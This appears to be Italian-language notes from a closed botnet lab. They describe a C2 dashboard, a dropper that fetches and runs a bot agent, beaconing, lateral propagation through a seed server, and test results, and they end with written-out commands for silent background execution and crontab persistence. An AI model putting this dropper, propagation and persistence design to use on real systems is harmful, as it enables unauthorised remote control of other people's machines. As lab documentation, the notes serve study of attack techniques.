# Botnet Lab - Note

## Macchine

| Ruolo | Machine | IP | Script |
|-------|---------|-----|--------|
| sergio | cs20 | C2_IP | `sergio.py` |
| Vittima 1 / Seed | cs33 | capybara-redacted | `bedbug.py` + `ciao.py` |
| Vittima 2 | cs23 (default - Arch Linux CT) | BOT2_IP | `bedbug.py` + `ciao.py` |

## Script

| File | Funzione |
|------|----------|
| `sergio.py` | sergio: dashboard, gestione bot, file server per ciao.py |
| `bedbug.py` | dropper: rileva OS, scarica ciao.py dal seed piu vicino, lo esegue |
| `ciao.py` | bot agent: beacon verso sergio + HTTP server 0.0.0.0:9090 che serve bedbug.py |

## Flusso completo passo per passo

### Fase 1 - Infezione cs33

```
[1] cs33: python3 bedbug.py (eseguito manualmente)
[2] bedbug.py scarica ciao.py da http://C2_IP:8081/ciao.py
[3] bedbug.py esegue: python3 ciao.py
```

### Fase 2 - cs33 diventa bot + seed

```
[4] ciao.py avvia due thread:
      thread A - beacon ogni 5s verso cs20:8080/heartbeat
      thread B - mini HTTP server su :9090 che serve bedbug.py
[5] cs33 appare nella dashboard di sergio.py come ATTIVO
```

### Fase 3 - Propagazione a cs23

```
[6] cs20 invia comando a cs33: "nmap -sV LOCAL_SUBNET"
[7] cs33 scopre cs23 a BOT2_IP
    vettore di accesso (SSH debole / exploit / altro):
      -> cs23 scarica bedbug.py da http://capybara-redacted:9090/bedbug.py
      -> cs23 esegue bedbug.py
[8] cs23 scarica ciao.py da cs20:8081 (o dal seed piu vicino)
[9] cs23 avvia ciao.py:
      thread A - beacon verso cs20:8080
      thread B - mini HTTP server su :9090
[10] cs23 appare nella dashboard come ATTIVO
```

## Porte

| Porta | Chi | Funzione |
|-------|-----|----------|
| :8080 | cs20 | sergio: dashboard, heartbeat, result |
| :8081 | cs20 | file server statico (serve ciao.py) |
| :9090 | ogni bot | seed server (serve bedbug.py) |

## Stato lab

| Step | Stato |
|------|-------|
| sergio.py avviato su cs20 | fatto |
| bedbug.py scarica ed esegue ciao.py su cs33 | fatto |
| ciao.py beacon verso cs20 | fatto |
| ciao.py apre seed server su cs33 (SEED_PORT e PAYLOAD_PORT) | fatto |
| cs23 scarica bedbug.py da cs33 via seed server | fatto |
| cs23 appare in dashboard | fatto |
| propagazione laterale cs33 -> cs23 | fatto |

## Documentazione

| File | Contenuto |
|------|-----------|
| `http-polling.md` | Beaconing, seed server, endpoints sergio |
| `propagation.md` | Propagazione laterale, bait page, social engineering |

## Potenziamenti opzionali

```bash
# avvio silenzioso in background
nohup python3 /tmp/ciao.py > /dev/null 2>&1 &

# persistenza al riavvio (inviare come comando dalla sergio dashboard)
(crontab -l 2>/dev/null; echo "@reboot cd /tmp && python3 ciao.py") | crontab -
```

---

## Risultati test (2026-04-03)

Lab completamente funzionante. Tutti i componenti testati e verificati:

- bedbug.py rileva OS e scarica ciao.py dal sergio correttamente
- ciao.py avvia beacon (heartbeat ogni 5s) e seed server (bait + payload)
- propagazione laterale cs33 -> cs23 funzionante via seed server
- dashboard sergio (sergio.py) mostra tutti i bot connessi in tempo reale
- comando impostato dalla dashboard ricevuto ed eseguito dai bot
- output dei comandi restituito correttamente al sergio via POST /result
